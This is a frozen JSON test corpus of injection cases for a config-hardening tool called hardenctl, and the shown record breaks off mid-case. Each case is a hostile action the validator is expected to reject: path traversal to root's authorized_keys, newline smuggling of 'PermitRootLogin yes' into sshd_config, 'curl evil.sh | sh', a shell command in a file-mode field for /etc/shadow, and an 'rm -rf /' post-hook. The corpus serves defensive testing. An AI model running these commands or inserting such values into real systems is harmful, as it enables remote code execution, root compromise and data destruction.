{
  "name": "hardenctl-injection-corpus",
  "version": 1,
  "frozen": "2026-09-26",
  "note": "FROZEN. Do not edit. Add cases only in a new version file. ${ROOT} is replaced with the sandbox root at load time.",
  "cases": [
    {
      "set": "regression",
      "gate": "schema",
      "expect": "reject",
      "label": "path traversal",
      "action": {
        "id": "m1",
        "action": "set_config_directive",
        "path": "/etc/../root/.ssh/authorized_keys",
        "directive": "Key",
        "value": "x",
        "justification": "arbitrary file write attempt"
      }
    },
    {
      "set": "regression",
      "gate": "schema",
      "expect": "reject",
      "label": "path outside tree",
      "action": {
        "id": "m2",
        "action": "set_config_directive",
        "path": "/root/.bashrc",
        "directive": "X",
        "value": "y",
        "justification": "write outside the permitted tree"
      }
    },
    {
      "set": "regression",
      "gate": "schema",
      "expect": "reject",
      "label": "newline injection in value",
      "action": {
        "id": "m3",
        "action": "set_config_directive",
        "path": "${ROOT}/etc/ssh/sshd_config",
        "directive": "Port",
        "value": "22\nPermitRootLogin yes",
        "justification": "smuggle a second directive through the value field"
      }
    },
    {
      "set": "regression",
      "gate": "schema",
      "expect": "reject",
      "label": "unknown action type",
      "action": {
        "id": "m4",
        "action": "run_shell",
        "command": "curl evil.sh | sh",
        "justification": "arbitrary command execution"
      }
    },
    {
      "set": "regression",
      "gate": "schema",
      "expect": "reject",
      "label": "malformed mode",
      "action": {
        "id": "m5",
        "action": "set_file_mode",
        "path": "${ROOT}/etc/shadow",
        "mode": "chmod 777",
        "justification": "command in the mode field"
      }
    },
    {
      "set": "regression",
      "gate": "schema",
      "expect": "reject",
      "label": "extra field smuggling",
      "action": {
        "id": "m6",
        "action": "disable_service",
        "unit": "telnet.service",
        "justification": "disable legacy service",
        "post_hook": "rm -rf /"
      }
    },
    {
      "set": "regression",
      "gate": "monotonicity",
      "expect": "reject",
      "label": "root login re-enabled",
      "action": {
        "id": "x1",
